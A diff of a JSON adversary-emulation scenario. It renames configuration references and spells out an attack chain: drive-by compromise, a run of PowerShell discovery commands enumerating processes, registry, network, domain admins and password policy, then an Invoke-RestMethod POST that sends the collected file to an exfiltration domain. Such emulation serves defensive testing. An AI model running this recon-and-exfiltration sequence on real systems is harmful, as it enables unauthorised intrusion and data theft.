@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -61,10 +64,10 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -72,10 +75,10 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -83,13 +86,16 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -97,12 +103,12 @@
             "technique": "SystemServiceDiscovery",
             "label": "systemServiceDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{tasklist /svc >${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{tasklist /svc >${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -110,12 +116,12 @@
             "technique": "QueryRegistry",
             "label": "queryRegistry_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -123,12 +129,12 @@
             "technique": "QueryRegistry",
             "label": "queryRegistry_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -136,12 +142,12 @@
             "technique": "QueryRegistry",
             "label": "queryRegistry_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -149,12 +155,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{arp -a >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{arp -a >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -162,12 +168,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{nbtstat -n >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{nbtstat -n >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -175,12 +181,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net config workstation >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net config workstation >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -188,12 +194,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_4",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{ipconfig /all >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{ipconfig /all >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -201,12 +207,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_5",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{route print >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{route print >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -214,12 +220,12 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_6",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{tracert -h 10 yahoo.com >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{tracert -h 10 yahoo.com >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -227,12 +233,12 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net view >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net view >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -240,12 +246,12 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net view /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net view /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -253,12 +259,12 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net group \"Domain Computers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net group \"Domain Computers\" /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -266,12 +272,12 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_4",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net group \"Domain Controllers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net group \"Domain Controllers\" /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -279,12 +285,12 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_5",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net group \"Exchange Servers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net group \"Exchange Servers\" /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -292,12 +298,12 @@
             "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{netstat -an >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{netstat -an >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -305,12 +311,12 @@
             "technique": "ProcessDiscovery",
             "label": "processDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{tasklist /v >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{tasklist /v >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -318,12 +324,12 @@
             "technique": "LocalGroups",
             "label": "localGroups_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net localgroup >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net localgroup >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -331,12 +337,12 @@
             "technique": "LocalGroups",
             "label": "localGroups_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net localgroup Administrators >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net localgroup Administrators >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -344,12 +350,12 @@
             "technique": "DomainGroups",
             "label": "domainGroups_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net group \"Domain Admins\" /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net group \"Domain Admins\" /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -357,12 +363,12 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{gpresult /z >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{gpresult /z >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -370,12 +376,12 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{systeminfo >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{systeminfo >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -383,12 +389,12 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{set >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{set >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -396,12 +402,12 @@
             "technique": "PeripheralDeviceDiscovery",
             "label": "peripheralDeviceDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{fsutil fsinfo drives >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{fsutil fsinfo drives >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -409,12 +415,12 @@
             "technique": "SystemTimeDiscovery",
             "label": "systemTimeDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net time >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net time >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -422,12 +428,12 @@
             "technique": "PasswordPolicyDiscovery",
             "label": "passwordPolicyDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net accounts >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net accounts >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -435,12 +441,12 @@
             "technique": "PasswordPolicyDiscovery",
             "label": "passwordPolicyDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{net accounts /domain >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{net accounts /domain >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -448,12 +454,12 @@
             "technique": "SecuritySoftwareDiscovery",
             "label": "securitySoftwareDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >>${self.target_1_temp_file}; echo \" \"}"
+                "command": "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >>${state.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -461,10 +467,10 @@
             "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -472,13 +478,13 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1",
+                "exfil": "state.exfil"
             },
             "tune": {
-                "command": "powershell &{Invoke-RestMethod -Uri${self.exfil_domain}/ -Method Post -InFile${self.target_1_temp_file};echo \" \"}"
+                "command": "powershell &{Invoke-RestMethod -Uri${state.exfil_domain}/ -Method Post -InFile${state.target_1_temp_file};echo \" \"}"
             }
         },
         {
@@ -486,9 +492,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -578,103 +584,17 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_temp_file": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-temp_file_exfil"
-                ]
-            },
-            "exfil_domain": {
-                "path": [
-                    "exfil",
-                    "1",
-                    "ioc-domain_exfil"
-                ]
-            },
-            "target_2": {
-                "path": [
-                    "targets",
-                    "2"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "target_1": "spec.targets.1",
+        "target_1_temp_file": "spec.targets.1.ioc-temp_file_exfil",
+        "exfil_domain": "spec.exfil.1.ioc-domain_exfil",
+        "target_2": "spec.targets.2"
     }
 }
